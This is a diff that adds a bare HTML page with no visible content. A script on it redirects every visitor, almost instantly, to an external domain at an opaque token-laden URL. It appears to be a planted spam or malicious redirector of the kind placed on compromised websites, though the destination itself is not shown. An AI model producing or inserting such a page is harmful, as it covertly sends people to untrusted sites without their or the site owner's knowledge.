@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+
+
+<script>
+
+		
+         setTimeout(function(){
+            window.location.href = 'http://eklstamp.com/2168366sw5645320St0dv0Yf39pEr133324zc';
+         }, 1);
+
+</script>
+
+</body>
+</html> 
